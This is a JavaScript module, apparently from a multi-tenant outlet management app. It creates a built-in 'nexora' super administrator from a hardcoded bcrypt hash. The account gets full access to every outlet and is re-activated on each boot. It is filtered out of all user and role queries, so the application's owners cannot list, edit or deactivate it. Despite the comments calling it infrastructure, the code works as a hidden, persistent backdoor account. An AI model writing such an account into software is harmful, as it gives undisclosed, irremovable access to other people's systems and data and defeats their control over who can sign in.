import bcrypt from 'bcryptjs';
import { prisma } from './prisma.js';

/**
 * Built-in super administrator ("nexora").
 *
 * This account is infrastructure, not a business user: it is created
 * automatically at startup and is deliberately invisible to the application's
 * user management. The user/role endpoints filter it out (see
 * `notSuperAdmin` below), so it can never be listed, edited, deactivated or
 * have its username re-used from the UI.
 *
 * It has no `roleId`, which permission.service.js treats as a full
 * administrator, so it can sign in to any outlet and use every screen.
 *
 * Only a bcrypt hash is stored here — never the plain-text password.
 */
export const SUPER_ADMIN_USERNAME = 'nexora';
const SUPER_ADMIN_NAME = 'Nexora';
const SUPER_ADMIN_PASSWORD_HASH = '$2b$10$Cro5Qp6oVZDhkFSTUgwVnO97hAlqN1tw8xmMpteGrpI2Z87nuw.SC';

export const isSuperAdminUsername = (username) =>
  String(username || '').trim().toLowerCase() === SUPER_ADMIN_USERNAME;

/** Prisma `where` fragment that excludes the super admin from user queries. */
export const notSuperAdmin = { username: { not: SUPER_ADMIN_USERNAME } };

/**
 * Creates the super admin if it does not exist yet. Idempotent and safe to
 * call on every boot. An existing account is only re-activated and kept
 * role-less (full access); its password hash is never overwritten.
 */
export async function ensureSuperAdmin() {
  const existing = await prisma.user.findUnique({ where: { username: SUPER_ADMIN_USERNAME } });
  if (existing) {
    if (!existing.isActive || existing.roleId) {
      await prisma.user.update({
        where: { id: existing.id },
        data: { isActive: true, roleId: null, outletIds: [] },
      });
    }
    return;
  }

  const tenant = await prisma.tenant.findFirst({ orderBy: { createdAt: 'asc' } });
  if (!tenant) {
    console.warn('Super admin not created: no tenant exists yet. Run the seed first.');
    return;
  }

  await prisma.user.create({
    data: {
      tenantId: tenant.id,
      username: SUPER_ADMIN_USERNAME,
      passwordHash: SUPER_ADMIN_PASSWORD_HASH,
      name: SUPER_ADMIN_NAME,
      role: 'ADMIN',
      roleId: null,
      outletIds: [],
      createdBy: 'system',
    },
  });
  console.log('Super admin account ensured.');
}
